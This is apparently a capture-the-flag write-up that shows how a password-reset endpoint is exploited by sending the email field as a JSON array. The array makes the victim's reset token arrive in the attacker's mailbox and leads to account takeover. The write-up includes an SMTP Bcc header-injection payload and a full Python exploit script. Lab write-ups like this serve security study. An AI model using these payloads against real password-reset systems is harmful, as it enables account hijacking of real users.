
When I opened the challenge at http://138.199.163.92:12770/login, I saw a login portal for "VaultNet Internal Evidence Portal". The challenge description said Om Nagda's account (om.nagda@kaalchakractf.com) was locked and I needed to use the password reset feature to get in. My attacker account should be name@emailaddress.com.

I started exploring the site and found a "Changelog" link. Changelogs are gold mines because they often reveal newly implemented features that might have bugs. Here's what caught my eye:

```
v2.3.0 (2026-02-14)
- Introduced self-service password reset
- SMTP relay integrated with internal mail server
```

So password reset was brand new, and there's SMTP integration. That screamed potential email injection vulnerabilities to me.

I registered an account with name@emailaddress.com and logged in. Looking around, I noticed a "Mailbox" link in the navigation. Interesting - this must be where password reset emails show up. I checked it and it was empty.

I opened DevTools and looked at the forgot-password page. The form used JavaScript to send JSON:

```javascript
async function submitReset() {
    const email = document.getElementById("email").value.trim();
    const res = await fetch("/forgot-password", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ email: email })
    });
}
```

It sends JSON with an email parameter. This made me think about parameter pollution - what if I send email as an array instead of a string?

I started testing different payloads:

First try - SMTP header injection with newlines:
```json
{"email": "om.nagda@kaalchakractf.com\nBcc: name@emailaddress.com"}
```
Got back: "If that address is registered, a reset link has been sent."

Second try - comma-separated emails:
```json
{"email": "om.nagda@kaalchakractf.com,name@emailaddress.com"}
```
Same response.

Third try - array poisoning:
```json
{"email": ["om.nagda@kaalchakractf.com", "name@emailaddress.com"]}
```
Same response, but something felt different.

I immediately checked my mailbox and boom - there was a NEW email! Looking at the tokens, I had three emails now instead of two. The latest one had a different token: 1bfd299a-3659-45b9-87eb-261c7d5c88b4

This was it! When I sent the email as an array, the backend must have iterated over it and sent Om Nagda's reset token to BOTH email addresses. My mailbox received his reset link!

I accessed the reset page with that token:
```
http://138.199.163.92:12770/reset?token=1bfd299a-3659-45b9-87eb-261c7d5c88b4
```

It showed a password reset form. I set a new password and then logged in as Om Nagda with the new credentials. His dashboard had a flag box:

```html
<div class="flag-box">
    <p class="flag-label">🔓 Classified Evidence Unlocked</p>
    <p class="flag-label">Case File #KC-2026-0042 — Contents Decrypted</p>
    <code class="flag">Kaal{arr4y_p0is0n_r3s3t_pwn3d}</code>
</div>
```

The vulnerability was in how the backend handled the email parameter. When sent as an array, it probably looked something like this:

```python
email = data.get('email')
if isinstance(email, list):
    for addr in email:
        send_reset_email(addr)  # Sends to ALL addresses!
```

So when I sent ["om.nagda@kaalchakractf.com", "name@emailaddress.com"], it generated Om Nagda's reset token and sent it to both addresses. My attacker account received his token in the mailbox, and I used it to take over his account.

Here's the complete exploit:

```python
import requests
import json
import re

URL = "http://138.199.163.92:12770"
session = requests.Session()

session.post(f"{URL}/register", data={
    'email': 'name@emailaddress.com',
    'password': 'Password123!',
    'confirm_password': 'Password123!'
})

session.post(f"{URL}/login", data={
    'email': 'name@emailaddress.com',
    'password': 'Password123!'
})

payload = {"email": ["om.nagda@kaalchakractf.com", "name@emailaddress.com"]}
session.post(
    f"{URL}/forgot-password",
    headers={"Content-Type": "application/json"},
    data=json.dumps(payload)
)

r = session.get(f"{URL}/mailbox")
tokens = re.findall(r'/reset\?token=([a-f0-9-]+)', r.text)
om_token = tokens[-1]

session.post(f"{URL}/reset?token={om_token}", data={
    'password': 'Hacked123!',
    'confirm_password': 'Hacked123!'
})

new_session = requests.Session()
new_session.post(f"{URL}/login", data={
    'email': 'om.nagda@kaalchakractf.com',
    'password': 'Hacked123!'
})

r = new_session.get(f"{URL}/dashboard")
flag = re.findall(r'Kaal\{[^}]+\}', r.text)[0]
print(flag)
```

Flag: Kaal{arr4y_p0is0n_r3s3t_pwn3d}

Team Exploit4
